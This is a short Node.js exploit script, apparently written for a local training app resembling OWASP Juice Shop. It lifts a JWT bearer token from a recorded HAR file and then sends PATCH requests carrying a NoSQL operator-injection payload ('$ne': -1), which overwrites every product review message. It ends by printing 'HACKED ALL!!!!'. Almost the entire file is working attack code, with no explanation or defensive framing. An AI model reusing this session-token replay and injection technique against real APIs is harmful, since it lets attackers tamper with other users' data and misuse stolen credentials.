const axios = require('axios');
const fs = require('fs');

function extractProductReviews(harFilePath, targetUrl) {
  const harData = JSON.parse(fs.readFileSync(harFilePath, 'utf8'));

  const relevantRequestsAndResponses = [];

  for (const entry of harData.log.entries) {
    const requestUrl = entry.request.url;
    if (requestUrl.match(targetUrl)) {
      relevantRequestsAndResponses.push({
        request: entry.request,
        response: entry.response
      });
    }
  }

  return relevantRequestsAndResponses;
}

const harFilePath = "har.har";
const targetUrl = "http://127.0.0.1:3000/rest/products/reviews";
const productReviews = extractProductReviews(harFilePath, targetUrl);

// Extract the JWT token from the authorization header
const token = productReviews[0].request.headers.at(3).value.split(' ')[1];

// Process the extracted requests and responses
productReviews.forEach(async ({ request, response }) => {
  if (request.method === 'PATCH') {
    // Perform NOSQL Injection
    const payload = { "id": { "$ne": -1 }, "message": "hey keekers:8" };

    try {
      const headers = {
        Authorization: `Bearer ${token}`
      };

      const response = await axios.patch(targetUrl, payload, { headers });
      console.log(response.data);
    } catch (error) {
      console.error('Error:', error);
    }
  }
});
console.log("HACKED ALL!!!!")
